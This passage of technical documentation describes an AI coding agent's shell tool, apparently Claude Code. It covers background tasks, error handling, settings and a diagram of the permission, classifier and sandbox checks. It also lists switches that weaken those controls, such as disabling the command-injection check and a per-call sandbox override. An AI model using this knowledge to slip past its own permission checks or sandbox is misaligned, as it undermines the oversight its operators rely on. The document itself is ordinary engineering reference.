| `test`/`[` | Condition true | Condition false | Error |

### Silent Commands

Commands that typically produce no stdout on success:
`mv`, `cp`, `rm`, `mkdir`, `rmdir`, `chmod`, `chown`, `chgrp`, `touch`, `ln`, `cd`, `export`, `unset`, `wait`

For these commands, the UI shows "Done" instead of "(No output)".

### Search/Read/List Classification

Commands are classified for collapsible UI display:

| Category | Commands |
|----------|----------|
| Search | `find`, `grep`, `rg`, `ag`, `ack`, `locate`, `which`, `whereis` |
| Read | `cat`, `head`, `tail`, `less`, `more`, `wc`, `stat`, `file`, `strings`, `jq`, `awk`, `cut`, `sort`, `uniq`, `tr` |
| List | `ls`, `tree`, `du` |
| Neutral | `echo`, `printf`, `true`, `false`, `:` |

For pipelines, ALL parts must be search/read commands for the whole command to be collapsible.

## Background Execution

### Explicit Backgrounding

When `run_in_background: true`:
1. A background task is spawned via `spawnShellTask()`
2. The task is registered in the task system
3. The model receives the task ID immediately
4. Output is written to the task's output file
5. The model is notified when the task completes

### User-Initiated Backgrounding (Ctrl+B)

When the user presses Ctrl+B during a running command:
1. `backgroundAll()` is called
2. ALL running foreground commands are backgrounded
3. In tmux, Ctrl+B must be pressed twice (first goes to tmux prefix)
4. The command continues running — no state is lost

### Auto-Backgrounding Conditions

Auto-backgrounding is enabled when:
- Background tasks are not disabled (`CLAUDE_CODE_DISABLE_BACKGROUND_TASKS`)
- The command is allowed (`isAutobackgroundingAllowed`)
- `sleep` is explicitly disallowed from auto-backgrounding

### Disallowed Auto-Background Commands

| Command | Reason |
|---------|--------|
| `sleep` | Should use Monitor tool or explicit backgrounding |

### Background Task Management

Background tasks are managed by `LocalShellTask`:
- `spawnShellTask()` — Creates a new background task
- `backgroundExistingForegroundTask()` — Converts foreground to background
- `backgroundAll()` — Backgrounds all foreground tasks
- `registerForeground()` / `unregisterForeground()` — Track foreground tasks
- `markTaskNotified()` — Marks a task as notified (suppresses redundant notifications)

## Claude Code Hints Protocol

CLIs and SDKs gated on `CLAUDECODE=1` can emit a `<claude-code-hint />` tag to stderr (merged into stdout). The BashTool:
1. Scans output for these tags
2. Records hints for `useClaudeCodeHintRecommendation`
3. Strips tags from output so the model never sees them

This is a zero-token side channel for CLI tools to communicate with Claude Code. Stripping runs unconditionally (subagent output must stay clean too).

## Git Operation Tracking

Git operations are tracked via `trackGitOperations()`:
- Command, exit code, and stdout are logged
- Git index.lock errors are specifically logged as `tengu_git_index_lock_error`
- This helps diagnose concurrent git operation issues

## Code Indexing Detection

Commands that perform code indexing are detected via `detectCodeIndexingFromCommand()`:
- Tool name, source (`cli`), and success are logged
- Helps track when the model triggers indexing operations

## Error Handling

### Pre-Spawn Errors

Errors that occur before the shell process starts are thrown as regular `Error` with the pre-spawn error message.

### Shell Errors

Shell errors are thrown as `ShellError` with:
- Empty message (stdout/stderr already contains the error)
- Full output (stdout + stderr merged)
- Exit code
- Interrupted flag

### Interrupt Handling

When a command is interrupted (abort controller signal = 'interrupt'):
- The exit code is NOT appended to output
- An error message `<error>Command was aborted before completion</error>` is added
- `interrupted: true` is set in the result

### Sandbox Violation Annotation

Sandbox violations are annotated in the output via `SandboxManager.annotateStderrWithSandboxFailures()`. This adds context about which sandbox restrictions caused failures.

### CWD Reset

After command execution, if the CWD has moved outside the allowed working directory:
- CWD is reset to the original directory
- A shell reset message is appended to stderr
- Event `tengu_bash_tool_reset_to_original_dir` is logged

## Configuration

### Environment Variables

| Variable | Purpose |
|----------|---------|
| `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` | Disables background task execution |
| `CLAUDE_CODE_BASH_SANDBOX_SHOW_INDICATOR` | Shows "SandboxedBash" label in UI |
| `CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK` | Disables command injection safety check |
| `CLAUDE_CODE_VERIFY_PLAN` | Enables plan verification tools |
| `USER_TYPE` | `'ant'` for internal users (enables extra features) |
| `CLAUDE_CODE_SIMPLE` | Simple mode — reduces tool set |
| `CLAUDEDECODE` | Set to `1` by CLIs to enable hint protocol |

### Settings

| Setting | Type | Default | Description |
|---------|------|---------|-------------|
| `sandbox.enabled` | boolean | false | Enable sandboxing |
| `sandbox.autoAllowBashIfSandboxed` | boolean | true | Auto-approve sandboxed bash commands |
| `sandbox.allowUnsandboxedCommands` | boolean | true | Allow `dangerouslyDisableSandbox` override |
| `sandbox.failIfUnavailable` | boolean | false | Fail if sandbox can't start |
| `sandbox.excludedCommands` | string[] | [] | Commands to exclude from sandboxing |
| `sandbox.network.allowedDomains` | string[] | [] | Allowed network domains |
| `sandbox.network.allowUnixSockets` | boolean | - | Allow Unix socket connections |
| `sandbox.network.allowLocalBinding` | boolean | - | Allow local network binding |
| `sandbox.ignoreViolations` | config | - | Silently ignore certain violations |
| `sandbox.ripgrep` | config | bundled | Ripgrep configuration |
| `sandbox.enabledPlatforms` | Platform[] | all | Restrict sandbox to specific platforms |
| `sandbox.enableWeakerNestedSandbox` | boolean | - | Weaker isolation for nested sandboxes |
| `sandbox.enableWeakerNetworkIsolation` | boolean | - | Weaker network isolation |

## Dependencies

### Internal

| Module | Purpose |
|--------|---------|
| `utils/bash/ast.ts` | Tree-sitter AST parsing for security analysis |
| `utils/bash/commands.ts` | Command splitting and operator extraction |
| `utils/bash/shellQuote.ts` | Shell command tokenization |
| `utils/bash/parser.ts` | Raw command parsing |
| `utils/bash/heredoc.ts` | Heredoc extraction |
| `utils/bash/registry.ts` | Command spec registry |
| `utils/bash/specs/` | Command-specific specs (timeout, sleep, nohup, etc.) |
| `utils/sandbox/sandbox-adapter.ts` | Sandbox runtime adapter |
| `utils/permissions/` | Permission system core |
| `utils/shell/readOnlyCommandValidation.ts` | Shared read-only validation |
| `utils/Shell.ts` | Shell execution wrapper |
| `utils/ShellCommand.ts` | Shell command result types |
| `utils/task/TaskOutput.ts` | Task output streaming |
| `utils/task/diskOutput.ts` | Disk output path management |
| `tasks/LocalShellTask/` | Background task management |
| `utils/toolResultStorage.ts` | Large result persistence |
| `utils/fileHistory.ts` | File history tracking for undo |
| `utils/claudeCodeHints.ts` | Hint extraction and stripping |
| `utils/codeIndexing.ts` | Code indexing detection |
| `utils/imageResizer.ts` | Image resizing for output |
| `utils/shell/outputLimits.ts` | Output size limits |
| `utils/permissions/pathValidation.ts` | Path validation core |
| `utils/permissions/filesystem.ts` | Working directory management |
| `utils/permissions/bashClassifier.ts` | Auto-mode classifier |
| `utils/permissions/shellRuleMatching.ts` | Shell rule pattern matching |
| `services/analytics/` | Event logging |
| `services/mcp/vscodeSdkMcp.js` | VS Code file update notification |

### External

| Package | Purpose |
|---------|---------|
| `@anthropic-ai/sdk` | API types (ToolResultBlockParam, etc.) |
| `@anthropic-ai/sandbox-runtime` | Sandbox runtime library |
| `zod/v4` | Input/output schema validation |
| `react` | UI rendering |
| `fs/promises` | File system operations |
| `bun:bundle` | Feature flag API |

## Data Flow

```
Model Request
    |
    v
BashTool Input { command, timeout?, description?, run_in_background?, dangerouslyDisableSandbox? }
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ VALIDATION                                                      │
│ - validateInput(): blocked sleep patterns                       │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ PERMISSION CHECK (bashToolHasPermission)                        │
│                                                                 │
│  1. Exact match rules (deny → ask → allow)                      │
│  2. Prefix/wildcard rules (deny → ask)                          │
│  3. Path constraints (checkPathConstraints)                     │
│     - Extract paths per command type                            │
│     - Validate against allowed directories                      │
│     - Check dangerous removal paths                             │
│     - Validate output redirections                              │
│  4. Sed constraints                                             │
│  5. Mode-specific checks (acceptEdits)                          │
│  6. Read-only rules (checkReadOnlyConstraints)                  │
│     - Command allowlist flag validation                         │
│     - Regex pattern matching                                    │
│     - Custom dangerous callbacks                                │
│  7. Bash classifier (auto-mode)                                 │
│                                                                 │
│ Decision: allow / deny / ask / passthrough                      │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ SANDBOX DECISION (shouldUseSandbox)                             │
│                                                                 │
│  - Is sandboxing enabled?                                       │
│  - Is dangerouslyDisableSandbox set?                            │
│  - Is command excluded?                                         │
│                                                                 │
│ Result: sandboxed or native                                    │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ EXECUTION (runShellCommand generator)                           │
│                                                                 │
│  - Create ShellCommand via exec()                               │
│  - Set up timeout                                               │
│  - Set up onProgress callback                                   │
│  - Set up auto-backgrounding on timeout                         │
│  - Set up assistant-mode auto-backgrounding (15s)               │
│  - Handle explicit run_in_background                            │
│  - Progress loop: race result vs progressSignal                 │
│  - Yield progress updates                                       │
│  - Return ExecResult                                            │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ RESULT PROCESSING                                               │
│                                                                 │
│  - Accumulate output (EndTruncatingAccumulator)                  │
│  - Interpret exit code semantics                                │
│  - Track git operations                                         │
│  - Detect code indexing                                         │
│  - Extract Claude Code hints                                    │
│  - Resize image output (if applicable)                          │
│  - Persist large output to disk                                 │
│  - Reset CWD if outside project                                 │
│  - Annotate sandbox violations                                  │
│  - Clean up shell resources                                     │
│  - Scrub bare git repo files (sandbox cleanup)                  │
└─────────────────────────────────────────────────────────────────┘
    |
    v
Output { stdout, stderr, interrupted, isImage?, backgroundTaskId?, ... }
    |
    v
Model Response (tool_result block)
```

## Integration Points

### Shell Execution (`utils/Shell.ts`)

The `exec()` function creates a `ShellCommand` that:
- Spawns the shell process
- Merges stdout and stderr (merged file descriptors)
- Streams output to a temp file
- Calls `onProgress` callback on each poll tick
- Supports timeout via `onTimeout` callback
- Returns a promise that resolves to `ExecResult`

### Task System (`tasks/LocalShellTask/`)

Background tasks are managed by the LocalShellTask system:
- `spawnShellTask()` — Registers a new background task
- `backgroundExistingForegroundTask()` — Converts foreground to background in-place
- `backgroundAll()` — Backgrounds all foreground tasks (Ctrl+B)
- Tasks write output to disk and notify on completion

### Sandbox Runtime (`@anthropic-ai/sandbox-runtime`)

The `SandboxManager` adapter wraps the external sandbox-runtime package:
- Converts Claude Code settings to sandbox config
- Initializes sandbox with log monitoring
- Subscribes to settings changes for dynamic updates
- Wraps commands with sandbox isolation
- Annotates stderr with sandbox failure information
- Cleans up after commands (scrubs planted files)

### Permission System

BashTool has the most complex permission integration of any tool:
- `preparePermissionMatcher()` — Parses compound commands for hook matching
- `checkPermissions()` — Full permission chain via `bashToolHasPermission()`
- `isReadOnly()` — Read-only classification via `checkReadOnlyConstraints()`
- `isConcurrencySafe()` — Read-only commands are concurrency-safe

### UI Rendering

- `renderToolUseMessage()` — Shows command text (truncated, or file path for sed)
- `renderToolUseProgressMessage()` — Shows `ShellProgressMessage` with output stats
- `renderToolUseQueuedMessage()` — Shows "Waiting…"
- `renderToolResultMessage()` — Shows `BashToolResultMessage` with stdout/stderr
- `renderToolUseErrorMessage()` — Shows `FallbackToolUseErrorMessage`
- `BackgroundHint` — Shows Ctrl+B shortcut hint during execution

### VS Code Integration

When a file is modified (sed simulated edit):
- Original content is read for diff calculation
- `notifyVscodeFileUpdated()` sends the change to VS Code
- File read state is updated to invalidate stale writes

### File History

For undo support:
- `fileHistoryTrackEdit()` records the edit in file history
- Only runs when file history is enabled and a parent message exists

## Error Handling

### Validation Errors

| Error Code | Condition |
|------------|-----------|
| 10 | Blocked sleep pattern (`sleep N`, N ≥ 2) |

### ShellError

Shell errors include:
- Empty message (error text is in the output)
- Full output (stdout + stderr merged)
- Exit code
- Interrupted flag

### Pre-Spawn Errors

Errors before process creation are thrown as regular `Error` with the pre-spawn error message.

### Interrupted Commands

When interrupted:
- Exit code is NOT appended
- `<error>Command was aborted before completion</error>` is added
- `interrupted: true` in result
- `is_error: true` in tool_result block

### Large Output

When output exceeds limits:
1. Preview is shown inline (first `getMaxOutputLength()` chars)
2. Full output is persisted to tool-results directory
3. Model receives `<persisted-output>` with file path
4. If > 64 MB, output is truncated after copying

## Related Modules

- [Tool System](../01-core-modules/tool-system.md) — Core tool abstraction
- [Sandbox Utils](../05-utils/sandbox-utils.md) — Sandbox utilities
- [Bash Utils](../05-utils/bash-utils.md) — Bash parsing utilities
- [Permissions Utils](../05-utils/permissions-utils.md) — Permission utilities
- [Permission Flow](../09-data-flow/permission-flow.md) — Permission decision flow
- [Tool Execution Flow](../09-data-flow/tool-execution-flow.md) — Tool execution pipeline
